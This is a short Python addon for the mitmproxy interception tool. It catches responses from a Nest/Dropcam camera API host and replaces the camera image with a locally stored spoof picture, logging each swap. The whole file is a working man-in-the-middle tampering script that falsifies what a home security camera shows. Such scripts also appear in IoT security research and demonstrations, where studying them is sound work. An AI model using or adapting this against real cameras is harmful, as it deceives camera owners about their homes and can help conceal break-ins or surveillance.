"""
This script rewrites the image from the Nest Cameras
"""
from mitmproxy import http, ctx
import os

def response(flow: http.HTTPFlow) -> None:
    if "nexusapi-us1.dropcam.com" in flow.request.pretty_host:
        data=str(flow.response.content)
        spoof =  open('images/nest-spoof.jpg','rb').read()
        flow.response.content=spoof
        ctx.log.alert("[Nest] <Spoofed Camera Image>")

